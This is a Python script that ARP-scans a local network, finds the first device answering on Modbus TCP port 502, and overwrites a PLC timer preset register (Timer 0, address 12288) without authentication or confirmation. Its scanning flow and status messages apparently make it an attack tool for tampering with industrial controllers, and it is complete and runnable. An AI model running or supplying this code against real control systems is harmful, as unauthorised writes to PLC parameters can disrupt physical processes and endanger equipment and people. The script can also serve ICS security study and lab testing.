import socket
from pymodbus.client.sync import ModbusTcpClient
from scapy.all import ARP, Ether, srp

# Configuration
PLC_DEFAULT_PORT = 502  # Modbus TCP port
NETWORK_RANGE = "192.168.9.0/24"  # Adapt to your network range
TARGET_TIMER_ADDRESS = 12288  # Equivalent to Timer preset address (%TM0)

def find_plc_ip(network_range):
    """
    Scans the specified IP range to locate the PLC IP via Modbus port.
    """
    print("[*] Scanning network for active devices...")
    devices = []
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range)
    result = srp(packet, timeout=2, verbose=False)[0]

    for sent, received in result:
        devices.append(received.psrc)

    for ip in devices:
        try:
            print(f"[*] Checking IP {ip} for Modbus service...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            if sock.connect_ex((ip, PLC_DEFAULT_PORT)) == 0:
                print(f"[+] Modbus PLC found at IP: {ip}")
                return ip  # Found the PLC
            sock.close()
        except Exception as e:
            print(f"[!] Error scanning IP {ip}: {e}")
    print("[-] No PLC found on the network.")
    return None

def modify_plc_parameter(plc_ip, address, value):
    """
    Connects to the PLC and modifies the specified parameter.
    """
    print(f"[*] Connecting to PLC at {plc_ip}...")
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print("[-] Unable to connect to the PLC.")
        return

    print(f"[*] Modifying parameter at address {address}...")
    try:
        # Write the new value to the specified register (word)
        response = client.write_register(address, value, unit=1)
        if response.isError():
            print(f"[-] Modbus error encountered: {response}")
        else:
            print(f"[+] Successfully updated parameter at address {address} to {value}.")
    except Exception as e:
        print(f"[!] Exception during Modbus operation: {e}")
    finally:
        client.close()
        print("[*] Connection closed.")

def main():
    print("[*] Starting...")
    plc_ip = find_plc_ip(NETWORK_RANGE)
    
    if plc_ip:
        print(f"[+] PLC IP found: {plc_ip}")
        # Modify Timer0 preset value: Example change to 60 seconds (60 * timebase)
        new_timer_value = 60  # Modify as needed
        modify_plc_parameter(plc_ip, TARGET_TIMER_ADDRESS, new_timer_value)
    else:
        print("[-] Could not find a PLC on the network.")

if __name__ == "__main__":
    main()